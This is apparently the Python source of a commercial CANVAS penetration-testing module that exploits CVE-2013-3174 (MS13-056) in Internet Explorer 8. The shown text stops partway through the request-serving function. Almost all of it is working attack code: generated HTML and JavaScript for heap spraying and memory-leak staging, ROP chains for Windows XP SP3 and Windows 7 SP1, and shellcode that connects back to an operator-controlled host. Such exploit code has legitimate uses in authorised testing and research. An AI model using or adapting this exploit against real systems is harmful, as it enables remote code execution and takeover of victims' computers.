#! /usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2009
# http://www.immunityinc.com/CANVAS/ for more information

from __future__ import with_statement
import sys
if "." not in sys.path:
    sys.path.append(".")

from exploitutils import *
from httpclientside import httpclientside

import sys
import canvasengine
import xorencoder

from shellcode import shellcodeGenerator
from tcpexploit import tcpexploit
from MOSDEF import mosdef
from httpclientside import httpclientside
from libs.spkproxy import header, body


NAME                            = "MS13_056"
DESCRIPTION                     = "Clientside exploit for IE8 DirectShow GIF rendering"
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "Microsoft"
DOCUMENTATION["Repeatability"]  = "Single"
DOCUMENTATION["References"]     = "http://technet.microsoft.com/en-us/security/bulletin/ms13-056"
DOCUMENTATION["CVE Name"]       = "CVE-2013-3174"
DOCUMENTATION["CVE Url"]        = "http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2013-3174"
DOCUMENTATION["NOTES"]          = """
This exploit has been tested on:
- Windows XP SP 3 EN on IE 8 (no js_recon)
- Windows 7 PRO SP 1 EN x86-64 on IE 8 32bit (js_recon works)

No webpage open in the browser before running the exploit.

Make sure to enable on the clientd response settings:
- Respond directly with exploit

In case you're on WinXP make sure "Always Do Recon" is de-selected.
"""

VERSION                         = "1.0"
PROPERTY                        = {}
PROPERTY['TYPE']                = "Exploit"
PROPERTY['SITE']                = "Clientside"
PROPERTY['ARCH']                = [ ["Windows"] ]
PROPERTY['VERSION']             = []
PROPERTY['DELIVERY']            = 'HTTP'

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)
        self.version        = 0
        self.name           = NAME
        # filename is used in the actual http server
        self.filename       = "".join( [ random.choice(string.uppercase) for x in range(8) ] ) + "00.html"

        self.pad_gif        = os.path.join(os.path.dirname(__file__), 'Resources', 'pad.gif')
        self.spray_gif      = os.path.join(os.path.dirname(__file__), 'Resources', 'spray.gif')
        self.leak_1_gif     = os.path.join(os.path.dirname(__file__), 'Resources', 'leak1.gif')
        self.leak_2_gif     = os.path.join(os.path.dirname(__file__), 'Resources', 'leak2.gif')
        self.corrupt_xp_gif = os.path.join(os.path.dirname(__file__), 'Resources', 'corrupt_xp.gif')
        self.corrupt_7_gif  = os.path.join(os.path.dirname(__file__), 'Resources', 'corrupt_7.gif')

        # no refresh since we need to keep this running for a while
        self.refresh_rate = 0

        self.use_leak     = False

    def is_vulnerable(self, info_dict):
        if "MSIE 8.0" in info_dict['user_agent']:
            return 100
        elif "compatible; MSIE 7.0" in info_dict['user_agent']:
            return 100
        else:
            self.log("Not IE 8 - possibly vulnerable, but not to the current exploit version")
            return 0

    def generate_leak_obj(self):
        alloc_size  = 0x1000
        attr_size   = 0x10
        self.num_of_leak_attr = (alloc_size / attr_size)

        sel_obj = """var sel = document.createElement("select");\n"""
        sel_obj += """sel.obj0 = alert;\n"""
        sel_obj += """sel.obj1 = alert;\n"""
        sel_obj += """sel.obj2 = alert;\n"""
        sel_obj += """sel.obj3 = alert;\n"""

        for i in range(4, self.num_of_leak_attr):
            sel_obj += """sel.obj""" + str(i) + """ = alert; """

        return sel_obj

    def generate_leak_sc_obj(self):
        alloc_size  = 0x1000
        attr_size   = 0x10
        self.num_of_leak_sc_attr = (alloc_size / attr_size)

        val = "C"

        sel_obj = """var sel = document.createElement("select");\n"""
        sel_obj += """sel.obj0 = "%s";\n""" % (val)
        sel_obj += """sel.obj1 = "%s";\n""" % (val)
        sel_obj += """sel.obj2 = "%s";\n""" % (val)
        sel_obj += """sel.obj3 = "%s";\n""" % (val)

        for i in range(4, self.num_of_leak_sc_attr):
            sel_obj += """sel.obj""" + str(i) + """ = "%s"; """ % (val)

        return sel_obj

    def generate_corruption_obj(self, sc_address=None):
        alloc_size = 0x1000
        attr_size  = 0x10
        if self.use_leak:
            alloc_size = 0x1000
        self.num_of_corr_attr = (alloc_size / attr_size) - 1
        if self.use_leak:
            self.num_of_corr_attr += 1

        if sc_address:
            low  = struct.pack(">H", (sc_address & 0xFFFF)).encode("hex")
            high = struct.pack(">H", ((sc_address >> 16) & 0xFFFF)).encode("hex")
            sc_addr = "%u" + low + "%u" + high
        else:
            if self.HTTPMOSDEF or self.useSSLMOSDEF:
                sc_addr = "%u197c%u03e0"
            else:
                sc_addr = "%u0b5c%u03e0"

        sel_obj = """var sel = document.createElement("select");\n"""
        sel_obj += """sel.obj0 = unescape("%s");\n""" % sc_addr
        sel_obj += """sel.obj1 = unescape("%s");\n""" % sc_addr
        sel_obj += """sel.obj2 = unescape("%s");\n""" % sc_addr
        sel_obj += """sel.obj3 = unescape("%s");\n""" % sc_addr

        for i in range(4, self.num_of_corr_attr):
            sel_obj += """sel.obj""" + str(i) + """ = unescape("%s"); """ % sc_addr

        return sel_obj

    def generate_sc_assignment(self):
        clones = ""
        for i in range(0, self.num_of_leak_attr):
            clones += """clones[i].obj""" + str(i) + """ = code; """

        return clones

    def generate_gif_tags(self, _type, entries):
        gif_element = ""
        num_of_gif  = entries
        if _type == "spray":
            gif = self.spray_gif

        for i in range(0, num_of_gif):
            elem_id = "_%s_%d" % (_type, i)
            gif_element += """<BGSOUND """
            if (_type in ("pad", "leak1", "leak2", "corrupt")):
                gif_element += """ID="%s" SRC="">\n""" % (elem_id)
            else:
                gif_element += """SRC="%s">\n""" % (gif)

        return gif_element

    def generate_sc_spray(self):
        rop = self.generate_rop_xpsp3()
        sc  = urluencode(rop + self.shellcode)

        spray_js = """
        var heap_obj = new heapLib.ie(0x20000);

        var code = unescape("%s");
        var nops = unescape("%%u0c0c%%u0c0c");

        while (nops.length < 0x1000) nops += nops;

        var shellcode = nops.substring(0, 0x800 - code.length) + code;

        while (shellcode.length < 0x40000) shellcode += shellcode;

        var block = shellcode.substring(2, (0x40000 - 0x21) / 2);
        heap_obj.gc();
        for (var i = 0; i < 600; i++) {
            heap_obj.alloc(block);
        }
        """ % (sc)

        return spray_js

    # only the required functionality
    def generate_heaplib(self):
        heaplib_js = """
        //   JavaScript Heap Exploitation library
        //   by Alexander Sotirov <asotirov@determina.com>
        //
        //   Version 0.3
        //
        // Copyright (c) 2007, Alexander Sotirov
        // All rights reserved.
        //
        // The HeapLib library is licensed under a BSD license, the text of which follows:
        //
        // Redistribution and use in source and binary forms, with or without
        // modification, are permitted provided that the following conditions
        // are met:
        //
        // 1. Redistributions of source code must retain the above copyright
        //    notice, this list of conditions and the following disclaimer.
        // 2. Redistributions in binary form must reproduce the above copyright
        //    notice, this list of conditions and the following disclaimer in the
        //    documentation and/or other materials provided with the distribution.
        // 3. Neither the name of Alexander Sotirov nor the name of Determina Inc.
        //    may be used to endorse or promote products derived from this software
        //    without specific prior written permission.
        //
        // THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
        // AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
        // IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
        // ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
        // LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
        // CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
        // SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
        // INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
        // CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
        // ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
        // POSSIBILITY OF SUCH DAMAGE.
        //

        function heapLib() {
        }

        heapLib.ie = function(maxAlloc, heapBase) {

            this.maxAlloc = (maxAlloc ? maxAlloc : 65535);
            this.heapBase = (heapBase ? heapBase : 0x150000);
            this.paddingStr = "AAAA";

            while (4 + this.paddingStr.length*2 + 2 < this.maxAlloc) {
                this.paddingStr += this.paddingStr;
            }

            this.mem = new Array();
            this.flushOleaut32();
        }

        heapLib.ie.prototype.debug = function(msg) {
            void(Math.atan2(0xbabe, msg));
        }

        heapLib.ie.prototype.debugHeap = function(enable) {

            if (enable == true)
                void(Math.atan(0xbabe));
            else
                void(Math.asin(0xbabe));
        }

        heapLib.ie.prototype.debugBreak = function(msg) {
            void(Math.acos(0xbabe));
        }

        heapLib.ie.prototype.padding = function(len) {
            if (len > this.paddingStr.length)
                throw "Requested padding string length " + len + ", only " + this.paddingStr.length + " available";

            return this.paddingStr.substr(0, len);
        }

        heapLib.ie.prototype.round = function(num, round) {
            if (round == 0)
                throw "Round argument cannot be 0";

            return parseInt((num + (round-1)) / round) * round;
        }

        heapLib.ie.prototype.hex = function(num, width)
        {
            var digits = "0123456789ABCDEF";

            var hex = digits.substr(num & 0xF, 1);

            while (num > 0xF) {
                num = num >>> 4;
                hex = digits.substr(num & 0xF, 1) + hex;
            }

            var width = (width ? width : 0);

            while (hex.length < width)
                hex = "0" + hex;

            return hex;
        }

        heapLib.ie.prototype.addr = function(addr) {
            return unescape("%u" + this.hex(addr & 0xFFFF, 4) + "%u" + this.hex((addr >> 16) & 0xFFFF, 4));
        }

        heapLib.ie.prototype.allocOleaut32 = function(arg, tag) {

            var size;

            if (typeof arg == "string" || arg instanceof String)
                size = 4 + arg.length*2 + 2;    // len + string data + null terminator
            else
                size = arg;

            if ((size & 0xf) != 0)
                throw "Allocation size " + size + " must be a multiple of 16";

            if (this.mem[tag] === undefined)
                this.mem[tag] = new Array();

            if (typeof arg == "string" || arg instanceof String) {
                this.mem[tag].push(arg.substr(0, arg.length));
            }
            else {
                this.mem[tag].push(this.padding((arg-6)/2));
            }
        }

        heapLib.ie.prototype.freeOleaut32 = function(tag) {

            delete this.mem[tag];
            CollectGarbage();
        }

        heapLib.ie.prototype.flushOleaut32 = function() {

            this.debug("Flushing the OLEAUT32 cache");

            this.freeOleaut32("oleaut32");

            for (var i = 0; i < 6; i++) {
                this.allocOleaut32(32, "oleaut32");
                this.allocOleaut32(64, "oleaut32");
                this.allocOleaut32(256, "oleaut32");
                this.allocOleaut32(32768, "oleaut32");
            }
        }

        heapLib.ie.prototype.alloc = function(arg, tag) {

            var size;

            if (typeof arg == "string" || arg instanceof String)
                size = 4 + arg.length*2 + 2;    // len + string data + null terminator
            else
                size = arg;

            if (size == 32 || size == 64 || size == 256 || size == 32768)
                throw "Allocation sizes " + size + " cannot be flushed out of the OLEAUT32 cache";

            this.allocOleaut32(arg, tag);
        }

        heapLib.ie.prototype.free = function(tag) {

            this.freeOleaut32(tag);
            this.flushOleaut32();
        }

        heapLib.ie.prototype.gc = function() {

            this.debug("Running the garbage collector");
            CollectGarbage();

            this.flushOleaut32();
        }

        heapLib.ie.prototype.freeList = function(arg, count) {

            var count = (count ? count : 1);

            for (var i = 0; i < count; i++) {
                this.alloc(arg);
                this.alloc(arg, "freeList");
            }
            this.alloc(arg);

            this.free("freeList");
        }

        heapLib.ie.prototype.lookaside = function(arg, count) {

            var size;

            if (typeof arg == "string" || arg instanceof String)
                size = 4 + arg.length*2 + 2;    // len + string data + null terminator
            else
                size = arg;

            if ((size & 0xf) != 0)
                throw "Allocation size " + size + " must be a multiple of 16";

            if (size+8 >= 1024)
                throw("Maximum lookaside block size is 1008 bytes");

            var count = (count ? count : 1);

            for (var i = 0; i < count; i++)
                this.alloc(arg, "lookaside");

            this.free("lookaside");
        }

        heapLib.ie.prototype.lookasideAddr = function(arg)
        {
            var size;

            if (typeof arg == "string" || arg instanceof String)
                size = 4 + arg.length*2 + 2;    // len + string data + null terminator
            else
                size = arg;

            if ((size & 0xf) != 0)
                throw "Allocation size " + size + " must be a multiple of 16";

            if (size+8 >= 1024)
                throw("Maximum lookaside block size is 1008 bytes");

            return this.heapBase + 0x688 + ((size+8)/8)*48;
        }


        heapLib.ie.prototype.vtable = function(shellcode, jmpecx, size) {

            var size = (size ? size : 1008);

            if ((size & 0xf) != 0)
                throw "Vtable size " + size + " must be a multiple of 16";

            if (shellcode.length*2 > size-138)
                throw("Maximum shellcode length is " + (size-138) + " bytes");

            var vtable = unescape("%u9090%u7ceb")   // nop, nop, jmp + 124

            for (var i = 0; i < 124/4; i++)
                vtable += this.addr(jmpecx);

            vtable += unescape("%u0028%u0028") +    // two sub [eax], al instructions
                      shellcode + heap.padding((size-138)/2 - shellcode.length);

            return vtable;
        }
        """
        heaplib_js = heaplib_js.replace("        ","")
        return heaplib_js

    def generate_leak_callback(self):
        checks = ""
        for i in range(1, self.num_of_leak_attr):
            checks += """else if (typeof(clones[index_].obj%d) == _type_) {
                             leak_done = true;

                             if (!leaked_pointer) {
                                 leaked_pointer = str_to_addr(clones[index_].obj%d) - 0x1BADC0;
                                 return next_stage(leaked_pointer, index_);
                             }

                             return;
                         }
            """ % (i, i)

        func = """
        function wait_for_leak(_type_) {
            var leaked_pointer = 0;
            var indexes = new Array();

            for (index_ = 0; index_ < clones_size; index_++) {
                if (clones[index_] != null) {
                    if (typeof(clones[index_].obj0) == _type_) {
                        leak_done = true;

                        if (!leaked_pointer) {
                            leaked_pointer = str_to_addr(clones[index_].obj0) - 0x1BADC0;
                            return next_stage(leaked_pointer, index_);
                        }

                        return;
                    } %s
                }
            }

            setTimeout("wait_for_leak('" + _type_ + "')", 100);
        }
        """ % (checks)

        return func

    def generate_leak_sc_callback(self):
        checks = ""
        for i in range(1, self.num_of_leak_attr):
            checks += """else if (typeof(clones[index_].obj%d) == _type_) {
                             leak_done = true;

                             var leaked_pointer = clones[index_].obj%d;

                             // Free all the array elements except the leaked one
                             // since we need the shellcode to stay there
                             for (var i = 0; i < clones_size; i++) {
                                 if (i != index_) {
                                     delete(clones[i]);
                                     clones[i] = null;
                                 }
                             }

                             parent.heap.gc();

                             var div = document.getElementById("_next");
                             var ifr = document.createElement("iframe");
                             ifr.setAttribute("src", leaked_pointer + ".addr2");
                             ifr.setAttribute("frameBorder", "0");
                             div.appendChild(ifr);

                             return 0;
                         }
            """ % (i, i)

        func = """
        function wait_for_leak_sc(_type_) {
            for (index_ = 0; index_ < clones_size; index_++) {
                if (clones[index_] != null) {
                    if (typeof(clones[index_].obj0) == _type_) {
                        leak_done = true;

                        var leaked_pointer = clones[index_].obj0;

                        // Free all the array elements except the leaked one
                        // since we need the shellcode to stay there
                        for (var i = 0; i < clones_size; i++) {
                            if (i != index_) {
                                delete(clones[i]);
                                clones[i] = null;
                            }
                        }

                        parent.heap.gc();

                        var div = document.getElementById("_next");
                        var ifr = document.createElement("iframe");
                        ifr.setAttribute("src", leaked_pointer + ".addr2");
                        ifr.setAttribute("frameBorder", "0");
                        div.appendChild(ifr);

                        return 0;
                    } %s
                }
            }

            setTimeout("wait_for_leak_sc('" + _type_ + "')", 100);
        }
        """ % (checks)

        return func

    def generate_corruption_callback(self):
        checks = ""

        for i in range(1, self.num_of_corr_attr):
            checks += """else if (typeof(clones[index_].obj%d) != _type_) {
                             corruption_done = true;

                             clones[index_].obj%d("w00t");
                             return 0;
                         }
                      """ % (i, i)

        func = """
        function wait_for_corruption(_type_) {
            for (index_ = 0; index_ < clones_size; index_++) {
                if (clones[index_] != null) {
                    if (typeof(clones[index_].obj0) != _type_) {
                        corruption_done = true;

                        clones[index_].obj0("w00t");
                        return 0;
                    } %s
                }
            }

            setTimeout("wait_for_corruption('" + _type_ + "')", 100);
        }
        """ % (checks)

        return func

    def generate_html_winxp(self):
        num_of_spray_gif    = 65
        num_of_pad_gif      = 5
        num_of_corrupt_gif  = 20

        if self.HTTPMOSDEF or self.useSSLMOSDEF:
            num_of_pad_gif = 10

        heaplib     = self.generate_heaplib()
        sc_spray    = self.generate_sc_spray()

        sel_obj  = self.generate_corruption_obj()

        gif_spray   = self.generate_gif_tags("spray", num_of_spray_gif)
        pad_spray   = self.generate_gif_tags("pad", num_of_pad_gif)
        corr_spray  = self.generate_gif_tags("corrupt", num_of_corrupt_gif)

        corruption_callback = self.generate_corruption_callback()

        html = """<html>
    <script language='javascript'>
        """ + heaplib + """
        """ + sc_spray + """

        var clones_size     = 5000;
        var clones          = new Array(clones_size);

        var corruption_done = false;

        """ + sel_obj + """

        var heap = new heapLib.ie();
        function spray_clones() {
            heap.gc();

            var i = 0;
            for (i = 0; i < clones_size; i++) {
                clones[i] = sel.cloneNode(true);
            }
        }

        function spray_moar_clones() {
            heap.gc();

            var i = 0;
            var _clones = new Array(clones_size);
            for (i = 0; i < clones_size; i++) {
                _clones[i] = sel.cloneNode(true);
            }
        }

        spray_clones();

        var counter = 0;
        function try_corruption() {
            if (corruption_done)
                return;

            if (counter >= %d) { """ % (num_of_corrupt_gif) + """
                counter = 0;
                return;
            }

            var _id = "_corrupt_" + counter;
            document.all[_id].src='""" + self.corrupt_xp_gif + """';
            counter++;

            setTimeout("try_corruption()", 500);
        }

        function insert_gif_pad() {
            if (counter >= %d) { """ % (num_of_pad_gif) + """
                counter = 0;
                return try_corruption();
            }

            var _id = "_pad_" + counter;
            document.all[_id].src='""" + self.pad_gif + """';
            counter++;

            setTimeout("insert_gif_pad()", 500);
        }

        """ + corruption_callback + """

        wait_for_corruption("string");
    </script>
    <body>
        """ + gif_spray  + """
        """ + pad_spray  + """
        """ + corr_spray  + """

        <script language="javascript">
            setTimeout("insert_gif_pad()", 5000);
        </script>
    </body>
</html>"""

        return html

    def generate_html_first_stage_win7(self):
        num_of_spray_gif    = 5
        num_of_pad_gif      = 10
        num_of_leak_gif     = 20

        heaplib       = self.generate_heaplib()

        sel_leak      = self.generate_leak_obj()
        gif_spray     = self.generate_gif_tags("spray", num_of_spray_gif)
        pad_spray     = self.generate_gif_tags("pad", num_of_pad_gif)
        leak_spray    = self.generate_gif_tags("leak1", num_of_leak_gif)

        leak_callback = self.generate_leak_callback()

        html = """
<html>
    <script language='javascript'>
        """ + heaplib + """
        """ + sel_leak + """

        var heap = new heapLib.ie();

        var clones_size     = 5000;
        var clones          = new Array(clones_size);

        var leak_done       = false;

        function spray_leak_clones() {
            heap.gc();

            var i = 0;
            for (i = 0; i < clones_size; i++) {
                clones[i] = sel.cloneNode(true);
            }
        }

        spray_leak_clones();

        function str_to_addr(str) {
                var p = Array();
                for(i = 0 ; i < 10 && p.length < 4 ; i++) {
                    x = str.charCodeAt(i);
                    if (x > 0xff00) {
                        y = (x & 0xff0000) >> 16;
                        x = x & 0xff00;
                        p.push(y);
                    }
                    if (x > 0xff) {
                        y = (x & 0xff00) >> 8;
                        x = x & 0xff;
                        p.push(y);
                    }
                    y = x;
                    p.push(y);
                }

                z    = p[1];
                p[1] = p[0];
                p[0] = z;

                z    = p[3];
                p[3] = p[2];
                p[2] = z;

                z    = p[0]
                p[0] = p[3]
                p[3] = z

                z    = p[1]
                p[1] = p[2]
                p[2] = z

                return  (p[0] << 24 | p[1] << 16 | p[2] << 8 | p[3]);
        }

        function next_stage(leaked_pointer, index) {
            heap.gc();

            // Free all the array elements starting from index + 1
            for (var i = index + 1; i < clones_size; i++) {
                delete(clones[i]);
                clones[i] = null;
            }

            heap.gc();

            // Append iframe
            var div = document.getElementById("_next");
            var ifr = document.createElement("iframe");
            ifr.setAttribute("src", leaked_pointer + ".addr1");
            ifr.setAttribute("frameBorder", "0");
            div.appendChild(ifr);
        }

        var counter = 0;
        function try_leak() {
            if (leak_done)
                return;

            if (counter >= %d) { """ % (num_of_leak_gif) + """
                document.location = "/exit";
            }

            var _id = '_leak1_' + counter;
            document.all[_id].src='""" + self.leak_1_gif + """';

            counter++;
            setTimeout("try_leak()", 500);
        }

        function insert_gif_pad() {
            if (counter >= %d) { """ % (num_of_pad_gif) + """
                counter = 0;
                return try_leak();
            }

            var _id = '_pad_' + counter;
            document.all[_id].src='""" + self.pad_gif + """';
            counter++;

            setTimeout("insert_gif_pad()", 500);
        }

        """ + leak_callback + """

        wait_for_leak("string");
    </script>
    <body>
        """ + gif_spray + """
        """ + pad_spray + """
        """ + leak_spray + """

        <script language="javascript">
            setTimeout("insert_gif_pad()", 5000);
        </script>

        <div id="_next"></div>
    </body>
</html>"""

        return html

    def generate_html_second_stage_win7(self, mshtml_base):
        num_of_leak_gif     = 20

        leak_spray          = self.generate_gif_tags("leak2", num_of_leak_gif)
        sel_leak            = self.generate_leak_obj()
        sc_assignment       = self.generate_sc_assignment()
        leak_sc_callback    = self.generate_leak_sc_callback()

        rop = self.generate_rop_7sp1(mshtml_base)
        sc  = urluencode(rop + self.shellcode)

        num_of_clones = 3000
        if self.HTTPMOSDEF or self.useSSLMOSDEF:
            num_of_clones   = 2000

        html = """
<html>
    <script language='javascript'>
        var code            = unescape("%s");
        var clones_size     = %d;
        var clones          = new Array(clones_size);

        var leak_done       = false;

        """ % (sc, num_of_clones) + sel_leak + """

        function spray_leak_sc_clones() {
            parent.heap.gc();

            var i = 0;
            for (i = 0; i < clones_size; i++) {
                clones[i] = sel.cloneNode(true);
            }
        }

        spray_leak_sc_clones();

        function add_sc_to_leak_objs() {
            parent.heap.gc();

            var i = 0;
            // Now that clones are correctly allocated and contiguous
            // add shellcode
            for (i = 0; i < clones_size; i++) {
                """ + sc_assignment + """
            }

            parent.heap.gc();
        }

        add_sc_to_leak_objs();

        var counter = 0;
        function try_leak() {
            if (leak_done)
                return;

            if (counter >= %d) { """ % (num_of_leak_gif) + """
                document.location = "/exit";
            }

            var _id = '_leak2_' + counter;
            document.all[_id].src='""" + self.leak_2_gif + """';
            counter++;

            setTimeout("try_leak()", 500);
        }

        """ + leak_sc_callback + """

        wait_for_leak_sc("number");
    </script>
    <body>
        """ + leak_spray + """

        <script language="javascript">
            try_leak();
        </script>

        <div id="_next"></div>
    </body>
</html>"""

        return html

    def generate_html_third_stage_win7(self, sc_address):
        num_of_corrupt_gif  = 20

        corr_spray          = self.generate_gif_tags("corrupt", num_of_corrupt_gif)
        sel_corr            = self.generate_corruption_obj(sc_address)
        corruption_callback = self.generate_corruption_callback()

        html = """
<html>
    <script language='javascript'>
        var clones_size     = 6000;
        var clones          = new Array(clones_size);

        var corruption_done = false;

        """ + sel_corr + """

        function spray_corruption_clones() {
            parent.parent.heap.gc();

            var i = 0;
            for (i = 0; i < clones_size; i++) {
                clones[i] = sel.cloneNode(true);
            }
        }

        spray_corruption_clones();

        var counter = 0;
        function try_corruption() {
            if (corruption_done)
                return;

            if (counter >= %d) { """ % (num_of_corrupt_gif) + """
                document.location = "/exit";
            }

            var _id = "_corrupt_" + counter;
            document.all[_id].src='""" + self.corrupt_7_gif + """';
            counter++;

            setTimeout("try_corruption()", 500);
        }

        """ + corruption_callback + """

        wait_for_corruption("string");
    </script>
    <body>
        """ + corr_spray + """

        <script language="javascript">
            try_corruption();
        </script>
    </body>
</html>"""

        return html

    def generate_rop_7sp1(self, base):
        # ROP generated for Win 7 SP 1 EN IE 8 in 32bit mode
        # null-free
        # mshtml.dll 8.0.7601.17514
        rop_gadgets = ""

        # - stack pivot from mshtml.dll
        # PUSH ECX
        # POP ESP
        # POP EDI
        # POP ESI
        # POP EBP
        # RETN 0x14
        rop_gadgets += struct.pack('<L', base + 0x351404) # RETN (ROP NOP) [mshtml.dll]
        rop_gadgets += struct.pack('<L', base + 0x339219) # stack pivot    [mshtml.dll]
        rop_gadgets += struct.pack('<L', base + 0x351404) # RETN (ROP NOP) [mshtml.dll]
        rop_gadgets += struct.pack('<L', base + 0x351404) # RETN (ROP NOP) [mshtml.dll]
        rop_gadgets += struct.pack('<L', base + 0x351404) # RETN (ROP NOP) [mshtml.dll]
        rop_gadgets += struct.pack('<L', base + 0x351404) # RETN (ROP NOP) [mshtml.dll]
        rop_gadgets += struct.pack('<L', base + 0x351404) # RETN (ROP NOP) [mshtml.dll]
        rop_gadgets += struct.pack('<L', base + 0x351404) # RETN (ROP NOP) [mshtml.dll]
        rop_gadgets += struct.pack('<L', base + 0x351404) # RETN (ROP NOP) [mshtml.dll]
        rop_gadgets += struct.pack('<L', base + 0x351404) # RETN (ROP NOP) [mshtml.dll]

        # rop chain
        rop_gadgets += struct.pack('<L', base + 0x351403) # POP EAX # RETN (NOP) [mshtml.dll]
        rop_gadgets += struct.pack('<L', base + 0x1348)   # ptr to &VirtualProtect() [IAT mshtml.dll]
        rop_gadgets += struct.pack('<L', base + 0x1282cf) # MOV EAX,DWORD PTR DS:[EAX] # RETN [mshtml.dll]
        rop_gadgets += struct.pack('<L', base + 0x28e833) # XCHG EAX,ESI # RETN [mshtml.dll]
        rop_gadgets += struct.pack('<L', base + 0x139717) # POP EBP # RETN [mshtml.dll]
        rop_gadgets += struct.pack('<L', base + 0x3b04f)  # & jmp esp [mshtml.dll]
        rop_gadgets += struct.pack('<L', base + 0x35134f) # POP EAX # RETN [mshtml.dll]
        rop_gadgets += struct.pack('<L', (len(self.shellcode) ^ 0xFFFFFFFF) + 1) # Value to negate
        rop_gadgets += struct.pack('<L', base + 0x424a4f) # NEG EAX # RETN [mshtml.dll]
        rop_gadgets += struct.pack('<L', base + 0x529a2e) # XCHG EAX,EBX # RETN [mshtml.dll]
        rop_gadgets += struct.pack('<L', base + 0x2e031f) # POP EAX # RETN [mshtml.dll]
        rop_gadgets += struct.pack('<L', 0xffffffc0)      # Value to negate, will become 0x00000040
        rop_gadgets += struct.pack('<L', base + 0x4249f2) # NEG EAX # RETN [mshtml.dll]
        rop_gadgets += struct.pack('<L', base + 0x3c8d1b) # XCHG EAX,EDX # RETN [mshtml.dll]
        rop_gadgets += struct.pack('<L', base + 0x31d6)   # POP ECX # RETN [mshtml.dll]
        rop_gadgets += struct.pack('<L', base + 0x53b181) # &Writable location [mshtml.dll]
        rop_gadgets += struct.pack('<L', base + 0x15f847) # POP EDI # RETN [mshtml.dll]
        rop_gadgets += struct.pack('<L', base + 0x1838e2) # RETN (ROP NOP) [mshtml.dll]
        rop_gadgets += struct.pack('<L', base + 0x341c6b) # POP EAX # RETN [mshtml.dll]
        rop_gadgets += struct.pack('<L', 0x90909090) # nop
        rop_gadgets += struct.pack('<L', base + 0x24dfb8) # PUSHAD # RETN [mshtml.dll]

        return rop_gadgets

    def generate_rop_xpsp3(self):
        # ROP generated for Win XP SP 3 EN IE 8
        # msvcrt.dll 7.0.2600.5512
        rop_gadgets = ""

        # - stack pivot from IMAGEHLP.DLL
        # XCHG ESP, ECX
        # OR BYTE PTR DS:[EAX], AL
        # ADD BYTE PTR DS:[EDI+5E], BL
        # RETN 8
        rop_gadgets += struct.pack('<L', 0x77c1c313) # RETN (ROP NOP) [msvcrt.dll]
        rop_gadgets += struct.pack('<L', 0x76c9b4c2) # stack pivot [IMAGEHLP.dll]
        rop_gadgets += struct.pack('<L', 0x77c1c312) # junk 4 bytes [msvcrt.dll]

        # ROP chain
        rop_gadgets += struct.pack('<L', 0x77c1c312) # POP EBP # RETN [msvcrt.dll]
        rop_gadgets += struct.pack('<L', 0x77c1c312) # skip 4 bytes [msvcrt.dll]
        rop_gadgets += struct.pack('<L', 0x77c46e91) # POP EBX # RETN [msvcrt.dll]
        rop_gadgets += struct.pack('<L', len(self.shellcode)) # EBX
        rop_gadgets += struct.pack('<L', 0x77c4e18c) # POP EDX # RETN [msvcrt.dll]
        rop_gadgets += struct.pack('<L', 0x00000040) # EDX
        rop_gadgets += struct.pack('<L', 0x77c3a3c8) # POP ECX # RETN [msvcrt.dll]
        rop_gadgets += struct.pack('<L', 0x77c5eb21) # &writable location [msvcrt.dll]
        rop_gadgets += struct.pack('<L', 0x77c3aeca) # POP EDI # RETN [msvcrt.dll]
        rop_gadgets += struct.pack('<L', 0x77c46101) # RETN (ROP NOP) [msvcrt.dll]
        rop_gadgets += struct.pack('<L', 0x77c2ed37) # POP ESI # RETN [msvcrt.dll]
        rop_gadgets += struct.pack('<L', 0x77c2aacc) # JMP [EAX] [msvcrt.dll]
        rop_gadgets += struct.pack('<L', 0x77c4e392) # POP EAX # RETN [msvcrt.dll]
        rop_gadgets += struct.pack('<L', 0x77c11120) # ptr to &VirtulProtect() [IAT msvcrt.dll]
        rop_gadgets += struct.pack('<L', 0x77c12df9) # PUSHAD # RETN [msvcrt.dll]
        rop_gadgets += struct.pack('<L', 0x77c354b4) # ptr to 'push esp # ret' [msvcrt.dll]

        return rop_gadgets

    def create_shellcode(self):
        if self.HTTPMOSDEF or self.useSSLMOSDEF:
            # we need to avoid using injectToSelf since CreateProcess is actually failing
            host = self.callback.ip
            port = self.callback.port
            self.log("Shellcode calling back to %s:%d"%(host, port))
            proxy_payload = ''

            import shellcode.standalone.windows.payloads as payloads
            p   = payloads.payloads()
            sc  = p.http_proxy(host, port, SSL=self.useSSLMOSDEF)

            proxy_payload = p.assemble(sc)
            self.log('HTTP MOSDEF payload size: %d bytes' % len(proxy_payload))
            self.log('HTTP MOSDEF callback IP: %s PORT: %s SSL: %s' % (host, port, self.useSSLMOSDEF))

            self.shellcode = proxy_payload
            if len(self.shellcode) % 2:
                self.shellcode += 'A'
        else:
            self.createShellcode()

    def makesploit(self, clientheader, clientbody):
        h = header('SERVER')
        b = body()

        if self.plugin_info:
            self.log("We got a plugin info for this target - thanks clientd!")
            info_dict   = self.plugin_info
            user_agent  = info_dict['user_agent']

            if self.is_vulnerable(info_dict):
                self.log("This client is most likely vulnerable!")
            else:
                self.log("Bailing on this client as it is not likely to be vulnerable.")
                return None, None
        else:
            user_agent = clientheader.getStrValue(['User-Agent'])

        # check if we need to use an info leak or not
        if "Windows NT 6.1" in user_agent:
            # info leaking
            self.use_leak = True

        if clientheader.URL.endswith(self.filename):
            self.log('Serving HTML file')

            if self.use_leak:
                html = self.generate_html_first_stage_win7()
            else:
